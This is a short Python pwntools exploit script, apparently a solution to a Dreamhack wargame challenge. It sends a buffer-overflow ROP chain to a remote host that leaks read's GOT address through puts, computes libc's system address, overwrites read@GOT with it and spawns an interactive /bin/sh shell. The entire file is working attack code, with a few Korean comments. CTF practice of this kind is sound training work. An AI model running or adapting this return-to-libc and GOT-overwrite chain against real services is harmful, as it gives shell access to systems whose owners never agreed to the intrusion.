from pwn import *

# Must be updated
p = remote("host3.dreamhack.games", 17810)
libc = ELF('./libc.so.6')

puts_plt = 0x8048420
exit_plt = 0x8048430
read_plt = 0x80483f0
read_got = 0x804a00c
pr_gadget = 0x080483d9
pppr_gadget = 0x08048689

# puts(read_got)
payload = b'\x90' * 68
payload += b'\x90' * 4
payload += p32(puts_plt)
payload += p32(pr_gadget)
payload += p32(read_got)

# read(0, read_got, 12)
payload += p32(read_plt)
payload += p32(pppr_gadget)
payload += p32(0)
payload += p32(read_got)
payload += p32(12)

# read("/bin/sh")
payload += p32(read_plt)
payload += p32(exit_plt)
payload += p32(read_got + 4)

p.sendline(payload)
p.recvn(64)                                          # write(1, buf, sizeof(buf))만큼 출력하므로 그 이후로부터 4 byte 받음
read_addr = u32(p.recvn(4))
print("read addr =", hex(read_addr))

# system 주소 구하기
libc_base = read_addr - libc.symbols['read']
system = libc_base + libc.symbols['system']
print("system addr = ", hex(system))

p.sendline(p32(system) + b'/bin/sh\x00')
p.interactive()
